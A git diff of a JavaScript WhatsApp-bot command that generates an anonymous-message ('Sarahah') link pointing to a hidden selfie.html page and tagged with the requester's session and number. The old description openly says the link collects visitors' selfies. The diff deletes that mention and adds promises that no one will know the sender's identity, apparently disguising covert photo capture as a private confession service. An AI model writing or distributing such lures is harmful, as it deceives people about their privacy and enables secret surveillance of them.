@@ -4,34 +4,42 @@ module.exports = {
     name: 'صارحني',
     aliases: ['رسالة', 'صراحة'],
     category: 'إداري',
-    description: 'توليد رابط صارحني الفخم لاستقبال الرسائل (وصور السيلفي) بسرية',
+    description: 'توليد رابط صارحني الفخم لاستقبال الرسائل بسرية تامة',
     async execute({ sock, msg, args, reply, from, sender, sessionId }) {
         try {
-            // استخراج رقم المرسل (الذي سيستقبل البيانات)
+            // استخراج رقم المرسل (لاستقبال البيانات عليه)
             const cleanSender = sender.split('@')[0];
 
-            // تحديد النطاق (الدومين) الخاص بالسيرفر
-            // سيتم استخدام رابط Render إذا كان متوفراً، وإلا سيتم استخدام الرابط المحلي
+            // جلب النطاق العام (دومين Render) أو السيرفر المحلي
             const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;
 
-            // بناء الرابط النهائي لصفحة صارحني (selfie.html) الموجودة في مجلد public
-            // تم تمرير session و target بشكل مخفي في الرابط
+            // بناء الرابط المباشر لصفحة الصارحني (selfie.html) المخبأة في public
             const sarahniUrl = `${serverBaseUrl}/selfie.html?session=${sessionId}&target=${cleanSender}`;
 
-            const responseText = `✨ *[بوابة المصارحة السرية - TARZAN VIP]* ✨\n\n` +
-                                 `👤 *الجلسة المرتبطة:* ${sessionId}\n` +
-                                 `🕒 *تاريخ التوليد:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}\n\n` +
-                                 `💌 *رابط استقبال الصراحة الخاص بك:* \n${sarahniUrl}\n\n` +
-                                 `💡 _انسخ هذا الرابط وأرسله لأصدقائك أو ضعه في البايو الخاص بك لاستقبال رسائلهم (وبعض المفاجآت الأخرى 😉)._`;
+            // تنسيق الرسالة بفخامة واحترافية للواتساب
+            const responseText = 
+`╭════ 💌 ﴿ بَـوَّابَـةُ الـمُـصَـارَحَـة ﴾ 💌 ════╮
+│
+│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
+│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
+│
+├══════════════════════════════┤
+│
+│ 🔗 ╟ *رَابِـطُ الاسْـتِـقْـبَـالِ الـخَـاصِّ بِـك:*
+│ ${sarahniUrl}
+│
+╰══════════════════════════════╯
 
-            // إرسال الرابط مع معاينة (Ad Reply) جذابة
+💡 *نَصِيحَة:* _انْسَخ هَذَا الرَّابِط، وَضَعْهُ فِي حَالَتِك أَوْ مِلَفِّكَ الشَّخْصِيِّ، وَاسْتَقْبِلْ رَسَائِلَ أَصْدِقَائِكَ (وَمُفَاجَآتِهِمْ) بِسِرِّيَّةٍ تَامَّةٍ 😉._`;
+
+            // إرسال الرسالة مع معاينة (Ad Reply) جذابة جداً
             await sock.sendMessage(from, {
                 text: responseText,
                 contextInfo: {
                     externalAdReply: {
-                        title: 'صارحني - رسائل سرية ومجهولة',
-                        body: 'اكتب رسالتك بسرية تامة، فنحن نضمن لك الخصوصية.',
-                        thumbnailUrl: 'https://b.top4top.io/p_3489wk62d0.jpg', // يمكنك تغيير هذه الصورة بصورة تعبر عن "صارحني"
+                        title: '💌 صارحني - رسائل سرية ومجهولة',
+                        body: 'اكتب ما في قلبك بسرية تامة.. لن يعرف أحد هويتك!',
+                        thumbnailUrl: 'https://cdn.pixabay.com/photo/2021/02/19/13/40/envelope-6030386_1280.png', // صورة ظرف رسالة وردي فخمة
                         sourceUrl: sarahniUrl,
                         mediaType: 1,
                         renderLargerThumbnail: true
